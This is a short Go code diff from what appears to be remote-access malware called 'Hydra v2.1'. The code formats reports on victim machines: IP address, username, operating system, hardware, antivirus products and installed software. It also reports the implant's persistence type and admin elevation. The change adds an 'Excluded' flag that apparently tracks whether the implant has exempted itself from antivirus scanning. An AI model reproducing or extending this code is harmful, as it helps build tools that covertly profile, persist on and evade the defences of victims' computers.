@@ -20,7 +20,7 @@ const (
 	fmtInfo = "```\nIP Address: %s\nComputer name: %s\nUsername: [%s] %s\nOperating System: %s %s\n" +
 		"CPU: %s\nGPU: %s\nMemory: %s\nAV:\n    %s\n```"
 	softInfo = "```\nInstalled Software:\n    %s```"
-	fmtInst  = "```\nHydra v2.1\nIIF Loaded: %v\nBase: %s\nInstall Date: %s\nPersistence: %d\nElevated: %v\n```"
+	fmtInst  = "```\nHydra v2.1\nIIF Loaded: %v\nBase: %s\nInstall Date: %s\nPersistence: %d\nElevated: %v\nExcluded: %v\n```"
 )
 
 func Info() {
@@ -62,6 +62,7 @@ func InstanceInfo() {
 			strings.Replace(install.Info.Date.Format(time.RFC3339), "T", " ", 1),
 			install.Info.PType,
 			util.RunningAsAdmin(),
+			install.Info.Exclusion,
 		),
 	)
 	cfg.ParseMode = "Markdown"
